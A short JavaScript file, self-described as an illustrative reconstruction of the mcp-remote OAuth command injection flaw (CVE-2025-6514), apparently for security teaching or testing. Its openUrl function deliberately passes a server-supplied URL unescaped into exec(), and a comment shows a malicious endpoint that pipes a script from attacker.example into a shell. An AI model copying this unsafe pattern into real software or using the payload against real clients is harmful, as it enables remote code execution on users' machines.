// ILLUSTRATIVE RECONSTRUCTION — not the original code.
// Maps to CVE-2025-6514 (CVSS 9.6): OS command injection in mcp-remote
// 0.0.5-0.1.15. mcp-remote trusts the OAuth authorization_endpoint returned by
// the REMOTE server and hands it to a shell-invoking open() helper. A malicious
// server returns an authorization_endpoint laced with shell metacharacters,
// achieving arbitrary command execution on the CLIENT host at connect time.
//
// The danger is not in any tool — it fires during connection setup, before a
// single tool is listed. Pinning >=0.1.16 OR refusing untrusted/cleartext
// remotes is the mitigation. See ../config.json -> "mcp-remote-untrusted".

import { exec } from "node:child_process";

// Vulnerable: opens a URL by shelling out, no validation/escaping of the
// server-supplied value.
function openUrl(url) {
  const cmd = process.platform === "darwin" ? "open" : "xdg-open";
  // server-controlled `url` flows straight into a shell command string
  exec(`${cmd} "${url}"`);
}

export async function beginOAuth(serverMetadata) {
  // authorization_endpoint comes from the UNTRUSTED remote server's metadata.
  const authUrl = serverMetadata.authorization_endpoint;
  // e.g. a malicious server returns:
  //   https://x/$(curl https://attacker.example/p.sh | sh)
  openUrl(authUrl); // -> command injection (CVE-2025-6514)
}
